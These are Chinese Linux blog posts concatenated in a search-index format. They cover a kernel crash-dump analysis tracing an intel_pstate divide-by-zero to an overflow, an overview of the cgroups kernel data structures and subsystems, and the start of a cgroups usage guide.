0x10 autopsy然后，尸检的活让我来！ 0x11 kernel version确认一下尸体信息，以及死因。 123456789101112 KERNEL: /usr/lib/debug/lib/modules/3.10.0-229.el7.x86_64/vmlinux DUMPFILE: vmcore [PARTIAL DUMP] CPUS: 24 DATE: Wed Aug 3 10:10:42 2016 UPTIME: 95 days, 17:54:10LOAD AVERAGE: 0.13, 0.13, 0.14 TASKS: 544 RELEASE: 3.10.0-229.el7.x86_64 VERSION: #1 SMP Fri Mar 6 11:36:42 UTC 2015 MACHINE: x86_64 (2394 Mhz) MEMORY: 95.6 GB PANIC: &quot;divide error: 0000 [#1] SMP &quot; kernel 是 centos 的3.10.0-229, 除 0 导致了死亡。 0x12 log知道了死于除 0, 利用 log 看一下凶手谁。 1234567891011121314151617181920212223242526272829303132333435363738PID: 0 TASK: ffff88183d27e660 CPU: 19 COMMAND: &quot;swapper/19&quot; #0 [ffff88187fce3a90] machine_kexec at ffffffff8104c681 #1 [ffff88187fce3ae8] crash_kexec at ffffffff810e2222 #2 [ffff88187fce3bb8] oops_end at ffffffff8160d188 #3 [ffff88187fce3be0] die at ffffffff810173eb #4 [ffff88187fce3c10] do_trap at ffffffff8160c860 #5 [ffff88187fce3c60] do_divide_error at ffffffff81013f7e #6 [ffff88187fce3d10] divide_error at ffffffff816160ce [exception RIP: intel_pstate_timer_func+376] RIP: ffffffff814a9d28 RSP: ffff88187fce3dc8 RFLAGS: 00010206 RAX: 0000000027100000 RBX: ffff880c3b059e00 RCX: 0000000000000000 RDX: 0000000000000000 RSI: 0000000000000010 RDI: 000000002e5361f0 RBP: ffff88187fce3e28 R8: ffff88183ca08038 R9: ffff88183ca08001 R10: 0000000000000002 R11: 0000000000000005 R12: 000000000000513f R13: 0000000000271000 R14: 000000000000513f R15: ffff880c3b059e00 ORIG_RAX: ffffffffffffffff CS: 0010 SS: 0018 #7 [ffff88187fce3e30] call_timer_fn at ffffffff8107e046 #8 [ffff88187fce3e68] run_timer_softirq at ffffffff8107fecf #9 [ffff88187fce3ee0] __do_softirq at ffffffff81077bf7#10 [ffff88187fce3f50] call_softirq at ffffffff8161635c#11 [ffff88187fce3f68] do_softirq at ffffffff81015de5#12 [ffff88187fce3f80] irq_exit at ffffffff81077f95#13 [ffff88187fce3f98] smp_apic_timer_interrupt at ffffffff81616fd5#14 [ffff88187fce3fb0] apic_timer_interrupt at ffffffff8161569d--- &lt;IRQ stack&gt; ---#15 [ffff880c3db4bde8] apic_timer_interrupt at ffffffff8161569d [exception RIP: native_safe_halt+6] RIP: ffffffff81052dd6 RSP: ffff880c3db4be90 RFLAGS: 00000286 RAX: 00000000ffffffed RBX: ffffffff8109b938 RCX: 0100000000000000 RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000046 RBP: ffff880c3db4be90 R8: 0000000000000000 R9: 0000000000000000 R10: 0000000000000004 R11: 0000000000000005 R12: 0000000085099e00 R13: 0000000000000013 R14: 00000002ed0ef7c8 R15: 001d63c002b695c0 ORIG_RAX: ffffffffffffff10 CS: 0010 SS: 0018#16 [ffff880c3db4be98] default_idle at ffffffff8101c93f#17 [ffff880c3db4beb8] arch_cpu_idle at ffffffff8101d236#18 [ffff880c3db4bec8] cpu_startup_entry at ffffffff810c6955#19 [ffff880c3db4bf28] start_secondary at ffffffff810423ca 可以看见intel_pstate_timer_func函数直接导致了死亡，后面开始了kdump收尸。 0x13 backtrace既然能大体确认凶手了，下面尝试看一下犯罪现场，利用bt的rip值ffffffff814a9d28找一下代码。 12345678910111213/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/drivers/cpufreq/intel_pstate.c: 470xffffffff814a9d15 &lt;intel_pstate_timer_func+357&gt;:\tmovslq %r12d,%r14/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/drivers/cpufreq/intel_pstate.c: 520xffffffff814a9d18 &lt;intel_pstate_timer_func+360&gt;:\tmovslq %r13d,%rax/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/drivers/cpufreq/intel_pstate.c: 6050xffffffff814a9d1b &lt;intel_pstate_timer_func+363&gt;:\tshl $0x8,%rdx/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/drivers/cpufreq/intel_pstate.c: 520xffffffff814a9d1f &lt;intel_pstate_timer_func+367&gt;:\tshl $0x8,%rax/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/include/linux/math64.h: 290xffffffff814a9d23 &lt;intel_pstate_timer_func+371&gt;:\tmovslq %edx,%rcx/usr/src/debug/kernel-3.10.0-229.el7/linux-3.10.0-229.el7.x86_64/include/linux/math64.h: 300xffffffff814a9d26 &lt;intel_pstate_timer_func+374&gt;:\tcqto 0xffffffff814a9d28 &lt;intel_pstate_timer_func+376&gt;:\tidiv %rcx 结合 backtrace 发现rcx是 0 且0xffffffff814a9d28处指令idiv %rcx,kernel 发生了除 0 异常。且还可以初步断定问题是：drivers/cpufreq/intel_pstate.c中的函数调用了include/linux/math64.h30 行的指令。 0x14 cause到底死亡背后的原因是什么？3.10.0-229.el7对应着源码包是3.10.0-229.el7.src.rpm, 并不能对应着upstream代码直接看，因为并不清楚 3.10 的哪个小版本。其中对应着intel_pstate_timer_func()的实现，且还利用的 log 的堆栈找出来 inline 函数的调用次序。 12345678910static void intel_pstate_timer_func(unsigned long __data)&#123;\tstruct cpudata *cpu = (struct cpudata *) __data;\tstruct sample *sample;\tintel_pstate_sample(cpu);\tsample = &amp;cpu-&gt;sample;\tintel_pstate_adjust_busy_pstate(cpu); // 这里！看函数名猜测是判断 busy 状态 ...&#125; 12345678910static inline void intel_pstate_adjust_busy_pstate(struct cpudata *cpu)&#123;\tint32_t busy_scaled;\tstruct _pid *pid;\tsigned int ctl;\tpid = &amp;cpu-&gt;pid;\tbusy_scaled = intel_pstate_get_scaled_busy(cpu); // 获取相关状态 ...&#125; 12345678910111213141516static inline int32_t intel_pstate_get_scaled_busy(struct cpudata *cpu)&#123;\tint32_t core_busy, max_pstate, current_pstate, sample_ratio;\tu32 duration_us;\tu32 sample_time; ...\tduration_us = (u32) ktime_us_delta(cpu-&gt;sample.time, cpu-&gt;last_sample_time);\tif (duration_us &gt; sample_time * 3) &#123; sample_ratio = div_fp(int_tofp(sample_time), // 死前一刀，int_tofp 始 duration_us 是 0. int_tofp(duration_us)); core_busy = mul_fp(core_busy, sample_ratio);\t&#125;\treturn core_busy;&#125; 这个时候查看 struct cpudata 结构体的值（这个是每 cpu 变量可以 p cpu_info:17）: 1234567891011121314151617181920212223242526272829303132struct cpudata &#123; cpu = 113, timer = &#123; entry = &#123; next = 0x0, prev = 0xdead000000200200 &#125;, expires = 8357799745, base = 0xffff883fe84ec001, function = 0xffffffff814a9100 &lt;intel_pstate_timer_func&gt;, data = 18446612406765768960,&lt;snip&gt; i_gain = 0, d_gain = 0, deadband = 0, last_err = 22489 &#125;, last_sample_time = &#123; tv64 = 4063132438017305 &#125;, prev_aperf = 287326796397463, prev_mperf = 251427432090198, sample = &#123; core_pct_busy = 23081, aperf = 2937407, mperf = 3257884, freq = 2524484, time = &#123; tv64 = 4063149215234118 &#125; &#125;&#125; 结合duration_us = (u32) ktime_us_delta(cpu-&gt;sample.time, cpu-&gt;last_sample_time)与上下文，计算采样间隔是 131901387587754ns, 进行 (u32) 类型转换也溢出。后面int_tofp实现为#define int_tofp(X) ((int64_t)(X) &lt;&lt; 8), 所以int_tofp(duration_us))调用导致其变成duration_us变成 0. 又因为div_fp的调用，所以 crash 出现了。 12345static inline int32_t div_fp(int32_t x, int32_t y)&#123;\treturn div_s64((int64_t)x &lt;&lt; FRAC_BITS, y);&#125; 出于完整性考虑，这里贴出了 inline 函数的调用次序 (基于源码阅读和 backtrace 凑出来的): 12345678910/** * div_s64 - signed 64bit divide with 32bit divisor */#ifndef div_s64static inline s64 div_s64(s64 dividend, s32 divisor)&#123;\ts32 remainder;\treturn div_s64_rem(dividend, divisor, &amp;remainder); // 捅出了那一刀&#125;#endif 到这里基本就和 log 显示调用栈一致了，代码在 math.h 的 30 行。 123456789/** * div_s64_rem - signed 64bit divide with 32bit divisor with remainder */static inline s64 div_s64_rem(s64 dividend, s32 divisor, s32 *remainder)&#123;\t*remainder = dividend % divisor;\treturn dividend / divisor; // 30 行，死亡！&#125; google 一下，看见了曾经有人遇到了这个问题： The kernel may delay interrupts for a long time which can result in timers being delayed. If this occurs the intel_pstate driver will crash with a divide by zero error 0x20 background and solution0x21 background这个驱动是 intel 为”SandyBridge+”微架构 CPU 提供的调整频率的控制接口 [^pstate]. 0x22 solution通过 Google 找到这个 bug 已经存在 [^patch] 的，所以目前最好方案是升级内核，centos 升级到 3.10.0-229.20.1.el7. 线上主机很多，提供一个临时的解决方案是：禁用 pstate[^wiki]. pstate 的新的功率驱动程序将会在以下的驱动程序之前自动为现代的 Intel CPU 启用。该驱动会优先于其他的驱动程序，因为它是内置驱动，而不是作为一个模块来加载。该驱动自动作用于 Sandy Bridge 和 Ivy Bridge 这两个类型的 CPU。如果您在使用这个驱动的时候遇到问题，建议您在 Grub 的内核参数中对其禁用（即修改 /etc/default/grub 文件，在GRUB_CMDLINE_LINUX_DEFAULT= 后添加intel_pstate=disable）。 0x23 The question of temporary solution方案提出了还没有验证，老大帮我验证了。 关闭了 P-State 后，内核层面失去了控制硬件 CPU 频率的接口，不再对 CPU 的频率进行控制。根据下图我们可以看到在我们禁用这个模块前，CPU 的频率受 P-State 的控制，同时 turbo 被打开，一直处于一个 2.6GHz 的水平。禁用后 CPU 频率不再受 P-State 控制，之前使用 P-State 打开的 turbo 也停止工作，最终频率稳定的工作在 CPU 的默认配置 2.4GHz。 还有一些问题有待以后验证。1: apic_timer_interrupt抛出去的异常。2: 不完整的 patch 猜想，准备和作者沟通一下描述这个问题。 关于问题 2, 作者已经给出了表述。 and found last_sample_time &#x3D; { tv64 &#x3D; -131888820469800 }. This doesn’t make sense. last_sample_time is a u64 field, so it can’t be negative. [^patch]: [PATCH] cpufreq, Fix overflow in busy_scaled due to long delay[^wiki]: archlinux wiki[^pstate]: intel-pstate","tags":["linux"]},{"title":"cgroups II - cgroup implementation overview","path":"/2016/07/29/cgroup-ii-implementation-overview/","content":"0x00 cgroups implementation因为cgroups其他子系统的应用远比net_cls要简单的多，所以后面不是介绍其他子系统使用，而是分析一下cgroups的实现 (base kernel 3.10).在正式切入实现之前回顾一下，cgroups子系统的介绍 [^lwn]. blkio — 这个子系统为块设备设定输入 &#x2F; 输出限制，比如物理设备（磁盘，固态硬盘，USB 等等）。 cpu — 这个子系统使用调度程序提供对 CPU 的 cgroup 任务访问。 cpuacct — 这个子系统自动生成 cgroup 中任务所使用的 CPU 报告。 cpuset — 这个子系统为 cgroup 中的任务分配独立 CPU（在多核系统）和内存节点。 devices — 这个子系统可允许或者拒绝 cgroup 中的任务访问设备。 freezer — 这个子系统挂起或者恢复 cgroup 中的任务。 memory — 这个子系统设定 cgroup 中任务使用的内存限制，并自动生成内存资源使用报告。… 省略掉一部分不是特别关注的子系统 (因为相对应用场景小，背景知识多!).这个 post 行文逻辑参考了 [^wangjiefeng], 各个子系统的实现位置可以参考 [^netlec]. 0x10 init cgroupscgroup是一个树状结构分布，系统在启动时候会创建一个cgroup系统，在start_kernel调用cgroup_init(), 这个函数实现在kernel/cgroup.c中。 1234567891011121314151617181920int __init cgroup_init(void)&#123; ... bdi_init(&amp;cgroup_backing_dev_info); ...\tfor (i = 0; i &lt; CGROUP_SUBSYS_COUNT; i++) &#123; ... cgroup_init_subsys(ss); ... cgroup_init_idr(ss, init_css_set.subsys[ss-&gt;subsys_id]);\t&#125;\tkey = css_set_hash(init_css_set.subsys);\thash_add(css_set_table, &amp;init_css_set.hlist, key);\tkobject_create_and_add(&quot;cgroup&quot;, fs_kobj); register_filesystem(&amp;cgroup_fs_type);\tproc_create(&quot;cgroups&quot;, 0, NULL, &amp;proc_cgroupstats_operations); ...&#125; bdi_init参数是 kernel 用来控制回写的结构体backing_dev_info, 其中有控制有控制 I&#x2F;O 带宽和被谁使用等重要参数。其主要工作是在利用for (i &lt; CGROUP_SUBSYS_COUNT)后面语句块为了每一个子系统调用cgroup_init_subsys()来初始化子系统，调用cgroup_init_idr()[^idr] 来创建Integer ID Management, 后利用css_set_hash与hash_add创建一个 hash 表，以此提高系统对一个已经存在的css_set的查找时性能，又利用kobject_create_and_add(&quot;cgroup&quot;, fs_kobj)创建一个kobject对象，利用register_filesystem(&amp;cgroup_fs_type)注册了cgroup文件系统，用proc_create(&quot;cgroups&quot;, 0, NULL, &amp;proc_cgroupstats_operations)在proc下创建了cgroup开关 [^source]. 0x20 mainly data structures因为每一个hierarchy中都有一个task文件，里面放置着 PID, 可以猜测进程是cgroup中重要的纽带，所以从task_struct结构来切入cgroup有关的主要代码。 123456#ifdef CONFIG_CGROUPS/* Control Group info protected by css_set_lock */ struct css_set __rcu *cgroups;/* cg_list protected by css_set_lock and tsk-&gt;alloc_lock */ struct list_head cg_list;#endif 可以看见cgroups是个css_set(cgroups subsystem status) 指针，而css_set存储了与进程相关的cgroups信息，cg_list是一个链表头指针，包含所有链接到同一个css_set的 task. css_set的结构如下： 1234567891011121314151617181920struct css_set &#123;\t/* 当前 css_set 引用计数器，因为 css_set 可以多个进程共用，只要这些进程的 cgroups 信息相同。*/\tatomic_t refcount;\t/* hlist 是 hash 表中的节点，用于把所有 css_set 组织成一个 hash 表，方便内核快速查找特定的 css_set. */\tstruct hlist_node hlist;\t/* task 指向所有连接到此 css_set 的进程组成的链表。*/\tstruct list_head tasks;\t/* cg_links 变量自当前的 css_set 指向 cg_group_link 组成的链表。*/\tstruct list_head cg_links;\t/* 子系统的状态集合，它由 init_css_set 的在系统启动和子系统模块载入和卸载时创建，且之后不能改变。*/\tstruct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];\t/* 利用 rcu 保证删除一致性 */\tstruct rcu_head rcu_head;&#125;; css_set-&gt;subsys是cgroup_subsys_state指针数组，它记录进程与特定子系统相关的信息，通过这个指针数组，进程可以获得相应的 cgroup 的控制信息。 cgroup_subsys_state结构如下： 1234567891011121314151617181920212223/* 由系统维护的每进程 / 每 cgroup 的状态 */struct cgroup_subsys_state &#123;\t/* * The cgroup that this subsystem is attached to. Useful * for subsystems that want to know about the cgroup * hierarchy structure */\tstruct cgroup *cgroup;\t/* * State maintained by the cgroup system to allow subsystems * to be &quot;busy&quot;. Should be accessed via css_get(), * css_tryget() and css_put(). */\tatomic_t refcnt;\tunsigned long flags;\t/* ID for this css, if possible */\tstruct css_id __rcu *id;\t/* Used to put @cgroup-&gt;dentry on the last css_put() */\tstruct work_struct dput_work;&#125; cgroup_subsys_state里面最重要的就是*cgroup字段，cgroup 指针指向一个 cgroup 结构，也就是进程所属的 cgroup. 进程收到特定子系统的控制就是加入特定的 cgroup 实现的。因为 cgroup 在特定 hierarchy 上面，而子系统有事附加到层级上的，这样结构就完整了梳理出来了task_struct-&gt;css_set-&gt;cgroup_state-&gt;cgroup.虽然注释写的是”由系统维护的每进程 &#x2F; 每 cgroup 的状态”, 但是在结构体里面并没有看见控制信息，知识定义了各个子系统都需要的共同信息，比如该 cgroup_subsys_state 从属的 cgroup. 其实各子系统在根据各自的实际需求实现自己的控制信息，最后在各自的结构体中将cgroup_subsys_state包含进去。这样 kernel 就可以用宏通过cgroup_subsys_state来获取相应的信息。[^wangjiefeng] cgroup_subsys_state-&gt;cgroup结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475struct cgroup &#123;\tunsigned long flags; /* &quot;unsigned long&quot; so bitops work */\t/* * count users of this cgroup. &gt;0 means busy, but doesn&#x27;t * necessarily indicate the number of tasks in the cgroup */\tatomic_t count;\tint id; /* ida 分配的层级内的 ID 号 */\t/* sibling, children, parent 利用兄弟孩子表示法将层级的 cgroup 构成一颗树。 * We link our &#x27;sibling&#x27; struct into our parent&#x27;s &#x27;children&#x27;. * Our children link their &#x27;sibling&#x27; into our &#x27;children&#x27;. */ struct list_head sibling;\t/* my parent&#x27;s children */\tstruct list_head children;\t/* my children */\tstruct list_head files; /* my files */\tstruct cgroup *parent; /* my parent */\tstruct dentry *dentry; /* cgroup 的 fs entry */\t/* * This is a copy of dentry-&gt;d_name, and it&#x27;s needed because * we can&#x27;t use dentry-&gt;d_name in cgroup_path(). * * You must acquire rcu_read_lock() to access cgrp-&gt;name, and * the only place that can change it is rename(), which is * protected by parent dir&#x27;s i_mutex. * * Normally you should use cgroup_name() wrapper rather than * access it directly. */\tstruct cgroup_name __rcu *name;\t/* subsys 中指针指向每一个已注册子系统的指针，root 指向所在层级的 cgroup 的 cgroup_root 结构体 */\tstruct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];\tstruct cgroupfs_root *root;\t/* * List of cg_cgroup_links pointing at css_sets with * tasks in this cgroup. Protected by css_set_lock */\tstruct list_head css_sets;\tstruct list_head allcg_node;\t/* cgroupfs_root-&gt;allcg_list */\tstruct list_head cft_q_node;\t/* used during cftype add/rm */\t/* * Linked list running through all cgroups that can * potentially be reaped by the release agent. Protected by * release_list_lock */\tstruct list_head release_list;\t/* * list of pidlists, up to two for each namespace (one for procs, one * for tasks); created on demand. */\tstruct list_head pidlists;\tstruct mutex pidlist_mutex;\t/* For RCU-protected deletion */\tstruct rcu_head rcu_head;\tstruct work_struct free_work;\t/* 用户态期望收到的事件列表 */\tstruct list_head event_list;\tspinlock_t event_list_lock;\t/* 目录的 xattrs */\tstruct simple_xattrs xattrs;&#125; cgroup-&gt;css_sets是一个头指针，指向由cg_cgroup_link(包含 cgroup 于 task 之间多对多关系的信息) 形成的链表。由此每一个cg_cgroup_link都包含一个指向css_set *cg指向每一个task的css_set.css_set结构中则包含tasks头指针。指向所有链接此css_set的 task 进程构成的链表。 cgroup-&gt;root是指向cgroupfs_root的指针，这就是 cgroup 所在层级对应的结构体。 cgroupfs_root结构如下： 12345678910111213141516171819202122232425262728293031323334353637383940struct cgroupfs_root &#123;\tstruct super_block *sb;\t/* bitmask 记录将要附加到层级的子系统 */\tunsigned long subsys_mask;\t/* 当前层级的 id 号 (唯一) */\tint hierarchy_id;\t/* 当前已经附加到层级的子系统掩码 */\tunsigned long actual_subsys_mask;\t/* A list running through the attached subsystems */\tstruct list_head subsys_list;\t/* 指向当前层级的根 cgroup, 也就是创建层级自动创建的 cgroup */\tstruct cgroup top_cgroup;\t/* 追踪当前层级对应的 cgroup 数量 */\tint number_of_cgroups;\t/* A list running through the active hierarchies */\tstruct list_head root_list;\t/* All cgroups on this root, cgroup_mutex protected */\tstruct list_head allcg_list;\t/* 层级详细的 flags */\tunsigned long flags;\t/* IDs for cgroups in this hierarchy */\tstruct ida cgroup_ida;\t/* The path to use for release notifications. */\tchar release_agent_path[PATH_MAX];\t/* 层级的名字 (也许是空的) */\tchar name[MAX_CGROUP_ROOT_NAMELEN];&#125;; cgroupfs_root-&gt;sb是指向该层级关联的文件系统的超级块。之所以cgroup与css_set之间多了一个cgroup_state结构体，是因为cgroup于css_set是一个多对多的关系需要一个中间结构将他们联系起来， 0x02 cgroup filesystemcgroups 是用户态接口是用文件系统实现的，在 linux 上实现文件系统必然要知道一些VFS相关的知识。 超级块对象 (superblock object): 存放已安装文件系统相关信息。 索引节点对象 (inode object): 存放关于文件的一般信息。 文件对象 (file object): 存放打开文件与进程直接的信息。 目录项对象 (dentry object): 存放目录项与对应文件进行链接的有关信息。 cgroup 文件系统的定义： 12345static struct file_system_type cgroup_fs_type = &#123;\t.name = &quot;cgroup&quot;,\t.mount = cgroup_mount, // mount\t.kill_sb = cgroup_kill_sb, // umount&#125;; 超级块定义： 123456static const struct super_operations cgroup_ops = &#123;\t.statfs = simple_statfs,\t.drop_inode = generic_delete_inode,\t.show_options = cgroup_show_options,\t.remount_fs = cgroup_remount,&#125;; 文件操作定义： 1234567static const struct file_operations cgroup_file_operations = &#123;\t.read = cgroup_file_read,\t.write = cgroup_file_write,\t.llseek = generic_file_llseek,\t.open = cgroup_file_open,\t.release = cgroup_file_release,&#125;; 索引块定义： 12345678910static const struct inode_operations cgroup_dir_inode_operations = &#123;\t.lookup = cgroup_lookup,\t.mkdir = cgroup_mkdir,\t.rmdir = cgroup_rmdir,\t.rename = cgroup_rename,\t.setxattr = cgroup_setxattr,\t.getxattr = cgroup_getxattr,\t.listxattr = cgroup_listxattr,\t.removexattr = cgroup_removexattr,&#125;; 0x10 subsystems子系统对应的实现在cgroup_subsys结构体中，其实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344struct cgroup_subsys &#123;\tstruct cgroup_subsys_state *(*css_alloc)(struct cgroup *cgrp);\tint (*css_online)(struct cgroup *cgrp);\tvoid (*css_offline)(struct cgroup *cgrp);\tvoid (*css_free)(struct cgroup *cgrp);\tint (*can_attach)(struct cgroup *cgrp, struct cgroup_taskset *tset);\tvoid (*cancel_attach)(struct cgroup *cgrp, struct cgroup_taskset *tset);\tvoid (*attach)(struct cgroup *cgrp, struct cgroup_taskset *tset);\tvoid (*fork)(struct task_struct *task);\tvoid (*exit)(struct cgroup *cgrp, struct cgroup *old_cgrp, struct task_struct *task);\tvoid (*bind)(struct cgroup *root);\tint subsys_id;\tint disabled;\tint early_init;\t/* ... */\tbool use_id;\t/* ... */\tbool broken_hierarchy;\tbool warned_broken_hierarchy;#define MAX_CGROUP_TYPE_NAMELEN 32\tconst char *name;\t/* Link to parent, and list entry in parent&#x27;s children. Protected by cgroup_lock() */\tstruct cgroupfs_root *root;\tstruct list_head sibling; /* used when use_id == true */\tstruct idr idr;\tspinlock_t id_lock;\t/* list of cftype_sets */\tstruct list_head cftsets;\t/* base cftypes, automatically [de]registered with subsys itself */\tstruct cftype *base_cftypes;\tstruct cftype_set base_cftset;\t/* should be defined only by modular subsystems */\tstruct module *module;&#125;; 结构体是各子系统的抽象，其中包含各子系统操作的交集。在实践具体子系统时候填充抽象中定义且需要的部分 (面向对象的 C 在 kernel 中大量使用). 0x14 blkio subsystemblkio subsystem 是基于CFQ实现的。 12345678910struct cgroup_subsyssu blkio_subsys = &#123;\t.name = &quot;blkio&quot;,\t.css_alloc = blkcg_css_alloc,\t.css_offline = blkcg_css_offline,\t.css_free = blkcg_css_free,\t.can_attach = blkcg_can_attach,\t.subsys_id = blkio_subsys_id,\t.base_cftypes = blkcg_files,\t.module = THIS_MODULE,&#125;; 0x11 cpu subsystem当运行 SCHED_NORMAL，SCHED_BATCH cpu subsystem 是基于CFS实现的，然后 dl_sched_class 调度类也是实现 fair_group_scheduling 但是两者之间差别目前还没有深究。 12345678910111213struct cgroup_subsys cpu_cgroup_subsys = &#123;\t.name = &quot;cpu&quot;,\t.css_alloc\t= cpu_cgroup_css_alloc,\t.css_free\t= cpu_cgroup_css_free,\t.css_online\t= cpu_cgroup_css_online,\t.css_offline\t= cpu_cgroup_css_offline,\t.can_attach\t= cpu_cgroup_can_attach,\t.attach = cpu_cgroup_attach,\t.exit = cpu_cgroup_exit,\t.subsys_id\t= cpu_cgroup_subsys_id,\t.base_cftypes\t= cpu_files,\t.early_init\t= 1,&#125;; 0x12 cpuset subsystem12345678910111213struct cgroup_subsys cpuset_subsys = &#123;\t.name = &quot;cpuset&quot;,\t.css_alloc = cpuset_css_alloc,\t.css_online = cpuset_css_online,\t.css_offline = cpuset_css_offline,\t.css_free = cpuset_css_free,\t.can_attach = cpuset_can_attach,\t.cancel_attach = cpuset_cancel_attach,\t.attach = cpuset_attach,\t.subsys_id = cpuset_subsys_id,\t.base_cftypes = files,\t.early_init = 1,&#125; 0x13 memory subsystem123456789101112131415struct cgroup_subsys mem_cgroup_subsys = &#123;\t.name = &quot;memory&quot;,\t.subsys_id = mem_cgroup_subsys_id,\t.css_alloc = mem_cgroup_css_alloc,\t.css_online = mem_cgroup_css_online,\t.css_offline = mem_cgroup_css_offline,\t.css_free = mem_cgroup_css_free,\t.can_attach = mem_cgroup_can_attach,\t.cancel_attach = mem_cgroup_cancel_attach,\t.attach = mem_cgroup_move_task,\t.bind = mem_cgroup_bind,\t.base_cftypes = mem_cgroup_files,\t.early_init = 0,\t.use_id = 1,&#125;; 0x15 freezer subsystem123456789101112struct cgroup_subsys freezer_subsys = &#123;\t.name = &quot;freezer&quot;,\t.css_alloc\t= freezer_css_alloc,\t.css_online\t= freezer_css_online,\t.css_offline\t= freezer_css_offline,\t.css_free\t= freezer_css_free,\t.subsys_id\t= freezer_subsys_id,\t.attach = freezer_attach,\t.fork = freezer_fork,\t.base_cftypes\t= files,&#125;; 0x16 drvices subsystem12345678910struct cgroup_subsys devices_subsys = &#123;\t.name = &quot;devices&quot;,\t.can_attach = devcgroup_can_attach,\t.css_alloc = devcgroup_css_alloc,\t.css_free = devcgroup_css_free,\t.css_online = devcgroup_online,\t.css_offline = devcgroup_offline,\t.subsys_id = devices_subsys_id,\t.base_cftypes = dev_cgroup_files,&#125; [^wangjiefeng]: 王喆锋 Linux Cgroups 详解[^source]: Cgroups 源码分析 1: 基本概念与框架[^lwn]: LWN Writeback and control groups[^idr]: idr - integer ID management[^netlec]: netlec","tags":["linux"]},{"title":"cgroups I - usage","path":"/2016/07/25/cgroup-i/","content":"0x00 what is cgroup?cgroups 是 Linux 内核的一个功能，用来限制，控制与分离一个进程组群的资源（如 CPU, 内存，网络，磁盘输入输出等). 0x01 The begin of cgroups这个项目最早是由 Google 的工程师在 2006 年发起 (主要是 Paul Menage 和 Rohit Seth), 最早的名称为进程容器 (process containers). 在 2007 年时，因为在 Linux 内核中，容器 (container) 这个名词有许多不同的意义，为避免混乱，被重命名为 cgroup, 并且被合并到 2.6.24 版的内核中去 [^wiki]. 0x02 featurecgroup 的一个设计目标是为不同的应用情况提供统一的接口，从控制单一进程 (像 nice) 到操作系统层虚拟化 (像 opeNVZ,Linux-VServer,LXC).cgroups 提供 [^access]： 资源限制：组可以被设置不超过设定的内存限制；这也包括虚拟内存。 优先化：一些组可能会得到大量的 CPU[5] 或磁盘输入输出通量。 报告：用来衡量系统确实把多少资源用到适合的目的上。 分离：为组分离命名空间，这样一个组不会看到另一个组的进程、网络连接和文件。 控制：冻结组或检查点和重启动。 0x03 the position of cgroups in kernel可以在下图看到其所在： architectures 0x10 The struct of cgroups0x11 term *任务 (Tasks)*：就是系统的一个进程。 *控制组 (Control Group)*：一组按照某种标准划分的进程，比如官方文档中的 Professor 和 Student, 或是 WWW 和 System 之类的，其表示了某进程组.Cgroups 中的资源控制都是以控制组为单位实现。一个进程可以加入到某个控制组。而资源的限制是定义在这个组上。简单点说，cgroup 的呈现就是一个目录带一系列的可配置文件。 *层级 (Hierarchy)*：控制组可以组织成 hierarchical 的形式，既一颗控制组的树 (目录结构). 控制组树上的子节点继承父结点的属性。简单点说，hierarchy 就是在一个或多个子系统上的 cgroups 目录树。 *子系统 (Subsystem)*：一个子系统就是一个资源控制器，比如 CPU 子系统就是控制 CPU 时间分配的一个控制器。子系统必须附加到一个层级上才能起作用，一个子系统附加到某个层级以后，这个层级上的所有控制族群都受到这个子系统的控制.Cgroup 的子系统可以有很多，也在不断增加中。 0x12 resource mangement引用这个图片，尝试解释一下 cgroup 的资源划分的结构。不同颜色代表不同group对资源的划分，不过这个设计存在一些缺陷已经遭到Tejun Heo的 吐槽, 某个任务归类方式的多样性导致了多个Hierarchy的正交，导致了进程管理的复杂。多个子系统的之间的交叉使用导致了管理的复杂，不过在一些 cgroup 套件里面使用配置文件转移一部这个问题的复杂度。 cgroups2 0x13 subsystem blkio — 这个子系统为块设备设定输入 &#x2F; 输出限制，比如物理设备（磁盘，固态硬盘，USB 等等）. cpu — 这个子系统使用调度程序提供对 CPU 的 cgroup 任务访问。 cpuacct — 这个子系统自动生成 cgroup 中任务所使用的 CPU 报告。 cpuset — 这个子系统为 cgroup 中的任务分配独立 CPU（在多核系统）和内存节点。 devices — 这个子系统可允许或者拒绝 cgroup 中的任务访问设备。 freezer — 这个子系统挂起或者恢复 cgroup 中的任务。 memory — 这个子系统设定 cgroup 中任务使用的内存限制，并自动生成​​内存资源使用报告。 net_cls — 这个子系统使用等级识别符（classid）标记网络数据包，可允许 Linux 流量控制程序（tc）识别从具体 cgroup 中生成的数据包。 net_prio — 这个子系统用来设计网络流量的优先级 hugetlb — 这个子系统主要针对于 HugeTLB 系统进行限制，这是一个大页文件系统。 0x20 Base usage in CLI0x21 确认系统在使用systemd的系统里面hierarchy由其启动时自动创建，在rhel6系列中需要yum install libcgroup, 如果是Ubuntu系列的话较新的版本是自带了。查看 cgroup 文件系统的挂载： 1234567891011# mount -t cgroupcgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct,cpu)cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/net_cls type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls) 查看子系统： 